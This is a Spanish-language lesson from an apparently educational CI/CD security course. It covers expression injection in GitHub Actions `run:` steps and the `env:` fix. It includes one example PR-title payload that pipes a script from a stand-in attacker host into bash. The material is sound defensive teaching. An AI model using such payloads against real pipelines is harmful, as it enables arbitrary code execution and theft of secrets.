# 07. Inyección de expresiones en `run` (IW: Injection Weakness)

**CWE:** CWE-20 (Improper Input Validation) / CWE-94 (Code Injection)
**Categoría OWASP CI/CD:** CICD-SEC-4 (Poisoned Pipeline Execution)
**Reglas Zenith Engine:** `R1016`
**Frecuencia real observada:** 362 alertas (1,7% del total), **siempre CRITICAL**: es la debilidad con el impacto más directo e inmediato de todo el catálogo.

## Qué es

GitHub Actions expande las expresiones `${{ ... }}` **como texto plano, antes de que la shell vea el script**. Si un `run:` contiene algo como:

```yaml
- run: echo "Título del PR: ${{ github.event.pull_request.title }}"
```

y el título del PR es (literalmente, escrito por cualquier usuario externo que abra un PR):

```
"; curl -s https://attacker.example/steal.sh | bash #
```

el step que realmente se ejecuta, **después de la expansión**, es:

```bash
echo "Título del PR: "; curl -s https://attacker.example/steal.sh | bash #"
```

No es una vulnerabilidad de la shell ni de bash: es que GitHub Actions hace una **sustitución de texto ciega** antes de invocar la shell, exactamente igual que una concatenación de SQL sin parametrizar. El atacante no necesita ningún acceso privilegiado; le basta con controlar el contenido de un campo que Zenith Engine considera "no confiable":

```
github.event.pull_request.title / .body / .head.ref / .head.label
github.event.issue.title / .body
github.event.comment.body
github.event.review.body
github.head_ref
github.event.inputs
steps.*   (outputs de un step anterior que a su vez pueda venir de input no confiable)
needs.*   (idem, de un job anterior)
```

`R1016` marca cualquier `run:` que contenga directamente alguna de estas expresiones.

## Por qué importa

A diferencia de la mayoría de fallos de este catálogo, este **no depende de que una dependencia se vea comprometida**: el atacante es simplemente cualquiera que pueda abrir un issue, un PR, o dejar un comentario. Es decir, en un repositorio público, *cualquier persona con una cuenta de GitHub*. Combinado con `pull_request_target` (lección [`06`](../06-triggers-privilegiados-pull-request-target/)), es ejecución de código arbitrario con acceso a secretos, sin ningún privilegio previo.

## Cómo solucionarlo

**Nunca interpoles una expresión no confiable directamente en un script.** Pásala como variable de entorno: la shell la trata como un valor de datos, no como código a expandir:

```yaml
- name: Usar el título del PR de forma segura
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Título del PR: $PR_TITLE"
```

Con esta forma, aunque `PR_TITLE` contenga `"; curl ... #`, la shell lo trata como el **valor literal** de la variable `$PR_TITLE`, no como comandos adicionales, porque la sustitución ya no ocurre a nivel de texto del script, sino a nivel de variable de entorno del proceso.

## Ejecuta la simulación

```bash
cd educational/es/07-inyeccion-de-expresiones
pip install pyyaml requests
python3 simulate.py
```

El script detecta `R1016` y **simula la expansión de texto que hace GitHub Actions**: toma un `github.event.pull_request.title` malicioso de ejemplo, lo sustituye literalmente en la plantilla del `run:` de `vulnerable.yml` (igual que hace el motor de Actions antes de invocar bash) y muestra el script final que realmente se ejecutaría. Después hace lo mismo con `fixed.yml` para mostrar por qué la versión con `env:` es inmune a la inyección.

### Con Docker (opcional): prueba real de ejecución

`docker/` contiene un sandbox mínimo que **ejecuta de verdad**, en un contenedor aislado (sin red, sin tocar tu máquina ni GitHub), el script resultante de la expansión, para comprobar en un shell real, no solo en teoría, que la versión vulnerable ejecuta el comando inyectado y la corregida no.

```bash
cd educational/es/07-inyeccion-de-expresiones/docker
docker compose up --build
```

## Tu turno

[`ejercicio.yml`](ejercicio.yml) es un bot que responde a `/saludo` en los comentarios de las issues. Mete el comentario, el título de la issue y la salida de un step anterior directamente en los scripts. Haz que esos datos sigan llegando a los scripts, pero sin que nadie pueda inyectar comandos.

```bash
cp ejercicio.yml mi_solucion.yml     # trabaja sobre la copia
python3 ../comprobar.py              # repite hasta ver "SUPERADO"
python3 ../comprobar.py --todas      # reto extra: todas las reglas del motor
```

El comprobador ejecuta las mismas reglas reales de esta lección y además verifica que no hayas "resuelto" el ejercicio borrando lo que fallaba.

<details>
<summary>Pistas</summary>

- Cada `${{ ... }}` que hoy está dentro de un `run:` tiene que pasar a `env:`.
- La salida de un step (`steps.<id>.outputs.<nombre>`) también cuenta: su contenido salió del título de la issue.
- El `if:` del job no hay que tocarlo: se evalúa como expresión, no dentro de bash.
- El comprobador exige que los tres datos sigan usándose: borrarlos no vale.

</details>

La solución está en [`../soluciones/07.yml`](../soluciones/07.yml). Inténtalo antes de mirarla.
